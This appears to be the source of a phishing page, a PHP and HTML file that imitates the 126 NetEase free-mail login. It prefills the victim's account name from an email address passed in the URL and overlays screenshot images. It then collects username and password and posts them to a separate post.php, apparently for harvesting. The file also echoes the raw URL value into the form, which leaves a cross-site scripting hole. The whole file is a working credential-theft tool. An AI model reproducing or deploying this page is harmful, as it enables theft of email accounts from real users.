<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>126网易免费邮--你的专业电子邮</title>
<style> 
 
 .inputs {
    height: 39px;
    padding: 0 10px;
    
    background: #FFF;
    background: rgba(255, 255, 255, 0.2);
    box-shadow: inset 0 0 10px rgba(255, 255, 255, 0.5);
    font-family: 'Montserrat', sans-serif;
    text-indent: 10px;
 
    text-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
    font-size: 13px;
    width: 270px;
}


</style> 
</head>
<body>

<form method="POST" accept-charset="utf-8" name="login" id="login"  action="post.php">
<br><div id="image2" style="position:absolute; overflow:hidden; left:10px; top:5px; width:1338px; height:599px; z-index:1"><img src="images/3.png" alt="" title="" border=0 width=1328 height=599></div>

<div id="image5" style="position:absolute; overflow:hidden; left:918px; top:415px; width:200px; height:43px; z-index:4"><a href="#"><img src="images/5.png" alt="" title="" border=0 width=100 height=33></a></div>


<div id="image4" style="position:absolute; overflow:hidden; left:207px; top:664px; width:936px; height:42px; z-index:3"><a href="#"><img src="images/11.png" alt="" title="" border=0 width=936 height=42></a></div>



<input name="user" value="<?php echo $loginID; ?>" placeholder="邮箱帐号或手机号码"     required type="text" style="position:absolute;border:none;outline: none;padding-left:50px;font-weight: 5000 ;background:rgba(227,162,11,0.0);height:39px;border:none;outline: none;font-weight: bold;background:rgba(227,162,11,0.0);padding-left:18px;width:244;px;left:825px;top:193px;font-size:17px;z-index:8"><br><br><div><div>

<input name="pass" value="" placeholder="输入密码"     required type="password" style="position:absolute;border:none;outline: none;padding-left:50px;font-weight: 100 ;background:rgba(227,162,11,0.0);height:39px;border:none;outline: none;font-weight: bold;background:rgba(227,162,11,0.0);padding-left:18px;width:244;px;left:825px;top:253px;font-size:17px;z-index:8"><br>
<div id="formimage1" style="position:absolute; left:800px; top:350px; z-index:10"><input type="image" name="formimage1" width="350" height="55" src="images/7.png"></div>
</div>


</body>
</html>

